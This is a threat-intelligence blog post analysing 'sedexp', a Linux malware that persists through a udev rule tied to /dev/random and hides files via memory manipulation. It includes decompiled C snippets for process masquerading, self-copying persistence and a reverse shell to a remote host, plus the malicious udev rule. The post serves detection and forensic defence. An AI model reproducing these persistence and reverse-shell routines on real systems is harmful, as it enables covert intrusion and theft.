<picture><source media="(min-width:1900px)" srcSet="https://res.aon.com/image/fetch/ar_16:9,c_fill,f_auto,g_auto,h_152,w_271/https://assets.aon.com//-/media/images/photos/industries/featured/insurance-1394456695_rt.jpg"/><source media="(min-width:1200px)" srcSet="https://res.aon.com/image/fetch/ar_16:9,c_fill,f_auto,g_auto,h_107,w_191/https://assets.aon.com//-/media/images/photos/industries/featured/insurance-1394456695_rt.jpg"/><source media="(min-width:650px)" srcSet="https://res.aon.com/image/fetch/ar_16:9,c_fill,f_auto,g_auto,h_107,w_191/https://assets.aon.com//-/media/images/photos/industries/featured/insurance-1394456695_rt.jpg"/><img class="" src="https://res.aon.com/image/fetch/ar_1:1,c_fill,f_auto,g_auto,h_107,w_191/https://assets.aon.com//-/media/images/photos/industries/featured/insurance-1394456695_rt.jpg" alt="CrowdStrike" loading="lazy"/>

            <!-- -->    <section class="aon-article-hero aon-article-hero--theme-navy aon-article-hero--no-media aon-article-hero--no-cta">
        <div class="aon-article-hero__header">

August 19, 2024                        <span class="aon-eyebrow__optional-text">7 mins</span>
            </div>
            <h2 class="aon-article-hero__title">
                Unveiling &quot;sedexp&quot;: A Stealthy Linux Malware Exploiting udev Rules
            </h2>
            <div class="aon-article-hero__author">

            </div>
        </div>
        <div class="aon-article-hero__media aon-article-media">
            <div class="aon-article-media__shade"></div>
            <div class="aon-article-media__social-links">
                <div class="aon-social-icons">
            <a class="aon-social-icon" href="/cdn-cgi/l/email-protection#78470b0d1a121d1b0c452d160e1d111411161f5d4a485d4a4a0b1d1c1d00085d4a4a5d4b195d4a48395d4a482b0c1d19140c10015d4a483411160d005d4a483519140f190a1d5d4a483d00081417110c11161f5d4a480d1c1d0e5d4a482a0d141d0b5e191508431a171c014531580c101116135801170d5815111f100c581e11161c580c10110b58190a0c111b141d581e0a1715583917165811160b111f100c1e0d144258100c0c080b5d4b195d4a1e5d4a1e0f0f0f56191716561b17155d4a1e1d165d4a1e11160b111f100c0b5d4a1e1b011a1d0a5514191a0b5d4a1e0d160e1d111411161f550b1d1c1d0008" target="">
                    <svg class="aon-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <use xlink:href="/lib/icons/symbol-defs.svg#mail-outline"></use>
                    </svg>
            </a>
            <a class="aon-social-icon" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fwww.aon.com%2fen%2finsights%2fcyber-labs%2funveiling-sedexp&amp;title=Check out this article from Aon: Unveiling%20%22sedexp%22%3a%20A%20Stealthy%20Linux%20Malware%20Exploiting%20udev%20Rules https%3a%2f%2fwww.aon.com%2fen%2finsights%2fcyber-labs%2funveiling-sedexp&amp;summary=Unveiling%20%22sedexp%22%3a%20A%20Stealthy%20Linux%20Malware%20Exploiting%20udev%20Rules" target="_blank">
                    <svg class="aon-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <use xlink:href="/lib/icons/symbol-defs.svg#linkedin-logo-outline"></use>
                    </svg>
            </a>
</div>

            </div>
        </div>

        <h4 class="aon-article-hero__summary regular">
            Stroz Friedberg identified a stealthy malware, dubbed âsedexp,â utilizing Linux udev rules to achieve persistence and evade detection. This advanced threat, active since 2022, hides in plain sight while providing attackers with reverse shell capabilities and advanced concealment tactics.
        </h4>

    </section>

<!-- -->
<section class="layout-rich-text container">
    <section class="column-content">
        <!-- -->    <div class="richtext-editor-place">
        <h4>Introduction</h4>

<p>Stroz Friedberg recently identified active usage of a lesser-known Linux persistence technique by an as-yet unidentified piece of malware, dubbed âsedexp,â during an investigation. Despite the malware being in use since at least 2022, Stroz Friedberg has found multiple instances available in online sandboxes with zero detections.Â  At the time of this writing, the persistence technique used is not documented by MITRE ATT&amp;CK. This blog details the active use of this malware and its persistence technique by a financially motivated threat actor.</p>

<h4>Background on udev Rules</h4>

<p>Sedexp utilizes udev rules to maintain persistence. The malware hides the rules utilizing memory manipulation techniques detailed later in this post.</p>
<p>udev is a device management system for the Linux kernel, responsible for managing device nodes in the <i>/dev</i> directory. It dynamically creates or removes device node files, handles hotplug events to configure new devices, and loads drivers as necessary. udev rules are configuration files used by udev to match devices and execute actions in response to events such as adding or removing devices.</p>
<p>For example, when a USB device is plugged in, udev uses rules to determine the proper drivers to load and what actions to take. These rules are stored in files typically found in <i>/etc/udev/rules.d/</i> or <i>/lib/udev/rules.d/</i>. Each rule consists of conditions to match specific devices and corresponding actions to perform. A typical udev rule might look like this:</p>
<code>ACTION==&quot;add&quot;, KERNEL==&quot;sdb1&quot;, RUN+=&quot;/path/to/script&quot;</code>
<p>In this rule:</p>
<ul>
<li><b>ACTION==&quot;add&quot;</b> specifies that the rule applies when a device is added.</li>
<li><b>KERNEL==&quot;sdb1&quot;</b> matches the device name.</li>
<li><b>RUN+=&quot;/path/to/script&quot;</b> specifies a script to run when the rule conditions are met.</li></ul>
    </div>
<!-- -->    <div class="richtext-editor-place">
        <h4>Technical Analysis</h4>

<h5>Persistence through udev Rules</h5> 

<p>During a recent investigation, Stroz Friedberg discovered malware using udev rules to maintain persistence. This technique allows the malware to execute every time a specific device event occurs, making it stealthy and difficult to detect. The udev rule identified is as follows: </p>

<code>ACTION==&quot;add&quot;, ENV{MAJOR}==&quot;1&quot;, ENV{MINOR}==&quot;8&quot;, RUN+=&quot;asedexpb run:+&quot;</code>

<p>Breaking down the rule: </p>
<ul>
<li><b>ACTION==&quot;add&quot;</b>: This rule triggers when a device is added to the system.</li>
<li><b>ENV{MAJOR}==&quot;1&quot;</b>: This condition checks if the device&#x27;s major number is 1, typically associated with memory devices such as <i>/dev/mem</i>, <i>/dev/null</i>, and <i>/dev/zero</i>.</li>
<li><b>ENV{MINOR}==&quot;8&quot;</b>: This condition checks if the device&#x27;s minor number is 8, which corresponds to <i>/dev/random</i> for major number 1.</li>
<li><b>RUN+=asedexpb</b>: When the above conditions are met, the program or script asedexpb is executed along with any arguments.</li>
</ul>

<p>This rule ensures that the malware is run whenever <i>/dev/random</i> is loaded. <i>/dev/random</i> is a special file that serves as a random number generator, used by various system processes and applications to obtain entropy for cryptographic operations, secure communications, and other functions requiring randomness. It is loaded by the operating system on every reboot, meaning this rule would effectively ensure that the sedexp script is run upon system reboot.</p>
    </div>
<!-- -->    <div class="richtext-editor-place">
        <h5>Malware Capabilities</h5>
<p>The sedexp malware has notable features such as: </p>
<ul>
<li><b>Reverse Shell Capability</b>: It includes a reverse shell, allowing the threat actor to maintain control over the compromised system. </li>
<li><b>Memory Modification for Stealth</b>: The malware modifies memory to hide any file containing the string &quot;sedexp&quot; from commands like ls or find. In Stroz Friedbergâs investigation, this capability was used to conceal webshells, modified Apache configuration files, and the udev rule itself. </li>
</ul>
    </div>
<!-- -->    <div class="richtext-editor-place">
        <h5>Code Analysis</h5>
<p>The decompiled code reveals several steps that the sedexp malware takes to ensure its persistence and stealth. Here are key parts simplified for clarity: </p>
<ul>
<li><b>Memory Allocation and Argument Handling: </b>
<ul><li>The malware manipulates arguments to obfuscate its presence. </li>
<li>It changes the process name to kdevtmpfs using prctl to blend in with legitimate system processes.</li></ul></li></ul>
<pre><code>void *memory = calloc(arg_count + 1, sizeof(void *));
for (int i = 0; i &lt; arg_count; i++) {
        memory[i] = strdup(arguments[i]);
        memset(arguments[i], 0, strlen(arguments[i]));
}
arguments[0] = &quot;kdevtmpfs&quot;;
prctl(PR_SET_NAME, &quot;kdevtmpfs&quot;, 0, 0, 0);
</code></pre>

<ul><li><b>Persistence Setup</b>: The malware sets up persistence by copying itself to a specific location and creating a udev rule.</li></ul>
<pre><code>char buffer[4096];
if (readlink(&quot;/proc/self/exe&quot;, buffer, sizeof(buffer) - 1) != -1) {
    char new_path[1024];
    snprintf(new_path, sizeof(new_path), &quot;/lib/udev/%s&quot;, basename(buffer));
    system(&quot;cp -f %s %s &amp;&amp; sync&quot;, buffer, new_path);

    char rule_path[1024];
    snprintf(rule_path, sizeof(rule_path), &quot;/etc/udev/rules.d/99-%s.rules&quot;, basename(buffer));
    FILE *rule_file = fopen(rule_path, &quot;w+&quot;);
    if (rule_file) {
        fprintf(rule_file, &quot;ACTION==\&quot;add\&quot;, ENV{MAJOR}==\&quot;1\&quot;, ENV{MINOR}==\&quot;8\&quot;, RUN+=\&quot;%s %s:+\&quot;\n&quot;, new_path, &quot;run&quot;);
        fclose(rule_file);
    } else {
        exit(-1);
    }
} else {
    exit(-1);
}
</code></pre>

<ul><li><b>Reverse Shell Execution</b>: Depending on the input, it can set up a reverse shell, either using forkpty or creating pipes and forking a new process.</li></ul>

<pre><code>int socket_fd = socket(AF_INET, SOCK_STREAM, 0);
struct sockaddr_in addr;
addr.sin_family = AF_INET;
addr.sin_port = htons(port);
addr.sin_addr.s_addr = inet_addr(ip_address);
connect(socket_fd, (struct sockaddr *)&amp;addr, sizeof(addr));
dup2(socket_fd, STDIN_FILENO);
dup2(socket_fd, STDOUT_FILENO);
dup2(socket_fd, STDERR_FILENO);
execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL);
</code></pre>
    </div>
<!-- -->    <div class="richtext-editor-place">
        <h4>Threat Intelligence</h4>
<p>Our analysis revealed that the malware was employed by a financially motivated threat actor. Key threat intelligence findings include: </p>
<ul><li><b>Credit Card Scraping</b>: The malware was used to hide credit card scraping code on a webserver, indicating a focus on financial gain. </li>
<li><b>OSINT Findings</b>: Multiple public instances of this malware on an online sandbox had zero detections, highlighting its stealthy nature. </li>
<li><b>Historical Use</b>: This malware has been in use since at least 2022.</li></ul>

<h4>Conclusion</h4>
<p>The discovery of sedexp demonstrates the evolving sophistication of financially motivated threat actors beyond ransomware. Leveraging rarely utilized persistence techniques like udev rules highlights the need for thorough and advanced forensic analysis. Organizations should continuously update their detection capabilities, implement comprehensive security measures to mitigate such threats, and ensure a capable DFIR firm is engaged to complete a forensic review of any possibly compromised servers. </p>

<h4>Samples</h4>
<p>Below are hashes of additional public samples discovered by Stroz Friedberg. Many online sandboxes detect few or no detections at the time this blog was released:</p>
<table>
<tr><td>SHA256</td><td>43f72f4cdab8ed40b2f913be4a55b17e7fd8a7946a636adb4452f685c1ffea02</td></tr>
<tr><td>SHA256</td><td>94ef35124a5ce923818d01b2d47b872abd5840c4f4f2178f50f918855e0e5ca2</td></tr>
<tr><td>SHA256</td><td>b981948d51e344972d920722385f2370caf1e4fac0781d508bc1f088f477b648</td></tr>
</table>
    </div>
